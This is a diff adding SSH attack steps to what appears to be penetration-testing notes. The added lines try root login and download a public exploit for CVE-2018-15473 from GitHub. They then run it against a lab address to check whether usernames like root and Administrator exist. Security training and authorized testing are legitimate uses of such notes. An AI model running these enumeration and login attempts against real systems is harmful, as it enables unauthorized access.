@@ -198,6 +198,21 @@ Can determine version by scanning it with nmap or connecting to it with nc or te
 ```nc
 nc 192.168.1.10 22
 telnet 192.168.1.10 22
+ssh root@IP -p 22
+```
+Try to ssh
+```
+ssh root@IP -p 22
+```
+
+Enumerate valid usernames
+```
+wget https://raw.githubusercontent.com/Rhynorater/CVE-2018-15473-Exploit/master/sshUsernameEnumExploit.py
+// or locate sshUsernameEnumExploit.py
+
+python sshUsernameEnumExploit.py --port 22 --outputFile enum --outputFormat list --username root 10.11.1.35
+python sshUsernameEnumExploit.py --port 22 --outputFile enum --outputFormat list --username Administrator 10.11.1.35
+
 ```
 
 [Back](#summary)
